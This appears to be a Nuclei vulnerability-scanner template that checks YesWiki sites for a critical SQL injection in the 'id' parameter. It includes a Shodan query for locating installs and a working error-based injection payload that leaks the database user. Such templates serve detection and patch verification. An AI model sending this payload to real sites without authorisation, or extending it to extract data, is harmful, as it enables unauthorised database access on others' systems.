id: yeswiki-sql
info:
  name: YesWiki <2022-07-07 - SQL Injection
  author: arafatansari
  severity: critical
  description: A SQL injection vulnerability has been discovered in YesWiki before
    2022-07-07, which can potentially allow an attacker to manipulate data, access
    sensitive information, and gain unauthorized administrative access through the
    id parameter in the AccueiL URL.
  reference:
  - https://huntr.dev/bounties/32e27955-376a-48fe-9984-87dd77e24985
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    shodan-query: http.html:"yeswiki"
    impact: The SQL injection vulnerability in YesWiki before 2022-07-07 can lead
      to unauthorized access to sensitive information, data modification, and unauthorized
      administrative operations on affected sites.
    recommendation: It is strongly recommended to update to the latest version of
      YesWiki to mitigate the SQL injection vulnerability present in earlier versions.
  tags: yeswiki,sqli,huntr
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/?PagePrincipale/rss&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5({{num}}),1,user()))))--+-'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - c8c605999f3d8352d7bb792cf3f
  - type: status
    status:
    - 200
